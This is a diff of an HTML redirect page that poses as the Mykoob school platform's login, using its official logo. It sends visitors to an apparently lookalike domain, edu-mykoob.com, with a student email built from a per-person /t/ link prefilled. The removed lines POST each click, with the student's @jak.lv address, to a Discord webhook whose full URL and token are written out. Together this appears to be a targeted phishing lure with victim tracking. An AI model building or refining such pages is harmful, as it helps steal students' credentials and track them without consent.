@@ -1,113 +1,110 @@
 <!DOCTYPE html>
 <html lang="lv">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Mykoob — Pieslēgties</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Mykoob — Pieslēgties</title>
 
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
 
-    <style>
-        *,
-        *::before,
-        *::after {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-        html {
-            font-size: 16px;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #121212;
-            color: #f3f4f6;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
+<style>
+:root {
+  --bg: #121212;
+  --text: #f3f4f6;
+  --text-muted: #9ca3af;
+  --text-dim: #6b7280;
+  --accent: #489ffe;
+  --border: #2d2d2d;
+}
+@media (prefers-color-scheme: light) {
+  :root {
+    --bg: #ffffff;
+    --text: #111827;
+    --text-muted: #4b5563;
+    --text-dim: #6b7280;
+    --accent: #0274ef;
+    --border: #e5e7eb;
+  }
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { font-size: 16px; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; color-scheme: light dark; }
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
 
-        .redirect-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 40px 20px;
-            text-align: center;
-        }
+.redirect-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+  padding: 40px 20px;
+  text-align: center;
+}
 
-        .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #2d2d2d;
-            border-top-color: #489ffe;
-            border-radius: 50%;
-            animation: spin 0.8s ease-in-out infinite;
-            margin-bottom: 24px;
-        }
+.spinner {
+  width: 48px;
+  height: 48px;
+  border: 4px solid var(--border);
+  border-top-color: var(--accent);
+  border-radius: 50%;
+  animation: spin 0.8s ease-in-out infinite;
+  margin-bottom: 24px;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .redirect-text {
-            font-size: 16px;
-            color: #9ca3af;
-            margin-bottom: 8px;
-        }
-
-        .redirect-sub {
-            font-size: 14px;
-            color: #6b7280;
-        }
-    </style>
-
-    <script>
-        // ── Get student name from the URL ──
-        const path = window.location.pathname;
-        const parts = path.split('/').filter(p => p.length > 0);
-        const student = parts[parts.length - 1] || 'unknown';
-
-        // ── Only track if it's a /t/ link ──
-        if (path.includes('/t/') && student !== 'unknown' && student !== '404') {
-            const webhook = 'https://discord.com/api/webhooks/1547540540994621440/I295Pa8pLWiW3OzAbSUTbU-ad-prxpoXqJkeyQDCZF1xYjEZ0hNoz47Y8aQuDF_Bnk8w';
-
-            fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `👆 **Saites atvēršana**\n📧 E-pasts: ${student}@jak.lv\n🕐 Laiks: ${new Date().toLocaleString('lv-LV')}`
-                })
-            }).catch(err => console.log('Webhook error:', err));
-        }
-
-        // ── Redirect to homepage ──
-        setTimeout(function() {
-            window.location.href = 'https://edu-mykoob.com/';
-        }, 300);
-    </script>
+.redirect-text { font-size: 16px; color: var(--text-muted); margin-bottom: 8px; }
+.redirect-sub { font-size: 14px; color: var(--text-dim); }
+</style>
 </head>
 <body>
 
-    <div class="redirect-container">
-        <!-- Mykoob logo (same as main page) -->
-        <img 
-            src="https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png" 
-            alt="Mykoob" 
-            style="height: 36px; width: auto; margin-bottom: 40px;"
-        />
+<div class="redirect-container">
+<img
+  src="https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png"
+  alt="Mykoob"
+  id="brandLogo"
+  style="height: 36px; width: auto; margin-bottom: 40px;"
+/>
+<div class="spinner"></div>
+<div class="redirect-text">Novirzīšana uz pieslēgšanās lapu...</div>
+<div class="redirect-sub">Lūdzu, uzgaidiet</div>
+</div>
 
-        <div class="spinner"></div>
-        <div class="redirect-text">Novirzīšana uz pieslēgšanās lapu...</div>
-        <div class="redirect-sub">Lūdzu, uzgaidiet</div>
-    </div>
+<script>
+/* ── Nolasa studenta vārdu no URL ── */
+const path = window.location.pathname;
+const parts = path.split('/').filter(p => p.length > 0);
+const student = parts[parts.length - 1] || '';
+
+/* ── Validācija — tikai drošas rakstzīmes ── */
+const isValid = /^[a-zA-Z0-9._-]{1,64}$/.test(student) && !student.includes('..');
+
+/* ── Ja derīgs /t/<vārds> links → pāradresē ar ?email= parametru ── */
+let target = 'https://edu-mykoob.com/';
+if (path.includes('/t/') && isValid && student !== '404' && student !== 'unknown') {
+  target = 'https://edu-mykoob.com/?email=' + encodeURIComponent(student + '@jak.lv');
+}
+
+/* ── Logo maiņa pēc tēmas ── */
+const isLight = window.matchMedia('(prefers-color-scheme: light)').matches;
+document.getElementById('brandLogo').src = isLight
+  ? 'https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-dark-DX3tqsaM.png'
+  : 'https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png';
+
+/* ── Pāradresē pēc 300ms ── */
+setTimeout(function() {
+  window.location.href = target;
+}, 300);
+</script>
 
 </body>
 </html>
